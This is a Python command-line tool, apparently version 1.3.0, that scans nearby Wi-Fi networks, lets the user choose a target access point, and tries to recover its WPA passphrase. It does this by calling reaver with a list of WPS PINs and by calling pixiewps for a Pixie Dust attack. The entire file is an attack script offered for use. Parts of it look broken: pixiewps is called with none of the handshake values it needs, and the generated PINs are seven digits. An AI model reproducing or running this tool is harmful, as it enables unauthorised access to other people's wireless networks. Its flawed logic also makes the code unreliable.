#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Modify History :  => FARHAN 
# VERSION 1.3.0
# Open Source Code. Advanced logic, Wi-Fi discovery, custom PIN, Pixie fallback, multiple PIN attempts.

import sys, subprocess, os, tempfile, shutil, re, socket, pathlib, time, collections, statistics
from datetime import datetime
from time import sleep
from typing import Dict

now = datetime.now()
now_time = str(now.strftime("%d:%m:%Y - %H:%M:%S"))

def ani(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.004)

class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    def __str__(self):
        return self._str_repr

    def __int__(self):
        return self._int_repr

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper().zfill(12)
        return ':'.join(mac[i:i+2] for i in range(0, 12, 2))

class WPSpin:
    def getSuggestedList(self, mac):
        mac = NetworkAddress(mac)
        return [str((int(mac) + i) % 10000000).zfill(7) for i in range(1, 11)]

class PINTester:
    def __init__(self, interface, bssid):
        self.interface = interface
        self.bssid = bssid

    def test_pin(self, pin):
        ani(f"[*] Trying WPS PIN: {pin}")
        try:
            result = subprocess.run([
                "reaver", "-i", self.interface, "-b", self.bssid, "-p", pin, "-vv"
            ], capture_output=True, text=True, timeout=60)
            if "WPA PSK" in result.stdout or "[+] Pin cracked" in result.stdout:
                ani("[\u2713] Password found!")
                print(result.stdout)
                return True
            elif "WPS pin not found" in result.stdout:
                ani("[-] Pixie Dust failed. Attempting fallback PIN list...")
                return False
            else:
                ani("[!] PIN did not work.")
                return False
        except subprocess.TimeoutExpired:
            ani("[!] Reaver timeout.")
            return False

    def try_multiple_pins(self, mac, limit=10):
        spinner = WPSpin()
        pin_list = spinner.getSuggestedList(mac)
        ani(f"[*] Trying up to {limit} fallback pins...")
        for pin in pin_list[:limit]:
            if self.test_pin(pin):
                return True
        ani("[x] No valid PIN found from list.")
        return False

def scan_networks(interface):
    ani(f"[*] Scanning Wi-Fi networks on {interface}...")
    try:
        result = subprocess.run(["iwlist", interface, "scan"], capture_output=True, text=True)
        cells = re.split(r"Cell \d+ - Address: ", result.stdout)[1:]
        networks = []
        for cell in cells:
            lines = cell.strip().split('\n')
            bssid = lines[0].strip()
            essid = ""
            for line in lines:
                if "ESSID:" in line:
                    essid = line.split(':', 1)[1].strip('"')
            networks.append((essid, bssid))
        return networks
    except Exception as e:
        ani(f"[!] Failed to scan networks: {e}")
        return []

def show_menu():
    print("\n===== WPS Brute-Force Tool Menu =====")
    print("1. Try custom PIN")
    print("2. Run Pixie Dust + fallback")
    print("3. Try fallback PINs only")
    print("4. Scan and choose target")
    print("5. Exit")
    return input("Select an option (1-5): ").strip()

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="WPS Brute-force with Pixie Dust fallback")
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface (e.g. wlan0)")
    parser.add_argument("-b", "--bssid", help="Target BSSID (e.g. AA:BB:CC:DD:EE:FF)")
    parser.add_argument("-m", "--mac", help="Target MAC address")
    parser.add_argument("-p", "--pin", help="Custom PIN to try before brute-force")
    parser.add_argument("-K", "--known", action="store_true", help="Auto mode: Run Pixie Dust first, fallback if needed")
    parser.add_argument("--limit", type=int, default=10, help="Max fallback pins to try")
    args = parser.parse_args()

    bssid = args.bssid or args.mac
    mac = args.mac or args.bssid

    if not bssid:
        ani("[!] No BSSID/MAC provided. Use -b or scan option from menu.")

    tester = PINTester(args.interface, bssid) if bssid else None

    if args.known and bssid:
        ani("[*] Running auto mode: Pixie Dust + fallback")
        try:
            pixie = subprocess.run(["pixiewps", "--force"], capture_output=True, text=True)
            print(pixie.stdout)
            if "WPS pin not found" in pixie.stdout:
                ani("[!] Pixie Dust failed. Starting fallback.")
                tester.try_multiple_pins(mac, args.limit)
            else:
                ani("[\u2713] Pixie Dust succeeded.")
        except FileNotFoundError:
            ani("[!] Pixiewps tool not found. Please install it first.")
        ani("[*] Finished at " + now_time)
        sys.exit(0)

    while True:
        choice = show_menu()

        if choice == "1":
            if not args.pin:
                args.pin = input("Enter custom PIN: ").strip()
            if not tester:
                bssid = input("Enter BSSID: ").strip()
                tester = PINTester(args.interface, bssid)
            tester.test_pin(args.pin)

        elif choice == "2":
            if not tester:
                bssid = input("Enter BSSID: ").strip()
                mac = bssid
                tester = PINTester(args.interface, bssid)
            ani("[*] Running Pixie Dust...")
            try:
                pixie = subprocess.run(["pixiewps", "--force"], capture_output=True, text=True)
                print(pixie.stdout)
                if "WPS pin not found" in pixie.stdout:
                    ani("[!] Pixie Dust failed. Starting fallback.")
                    tester.try_multiple_pins(mac, args.limit)
                else:
                    ani("[\u2713] Pixie Dust succeeded.")
            except FileNotFoundError:
                ani("[!] Pixiewps tool not found. Please install it first.")

        elif choice == "3":
            if not tester:
                bssid = input("Enter BSSID: ").strip()
                tester = PINTester(args.interface, bssid)
            tester.try_multiple_pins(bssid, args.limit)

        elif choice == "4":
            networks = scan_networks(args.interface)
            if not networks:
                ani("[!] No Wi-Fi networks found.")
                continue
            print("\nAvailable Networks:")
            for idx, (essid, bssid) in enumerate(networks):
                print(f"{idx+1}. {essid or '<hidden>'} ({bssid})")
            sel = input("Choose target number: ").strip()
            if sel.isdigit() and 1 <= int(sel) <= len(networks):
                _, bssid = networks[int(sel)-1]
                mac = bssid
                tester = PINTester(args.interface, bssid)
                ani(f"[*] Target set to {bssid}")
            else:
                ani("[!] Invalid selection.")

        elif choice == "5":
            ani("[*] Exiting script.")
            break

        else:
            ani("[!] Invalid option. Please choose 1-5.")

    ani("[*] Finished at " + now_time)
  
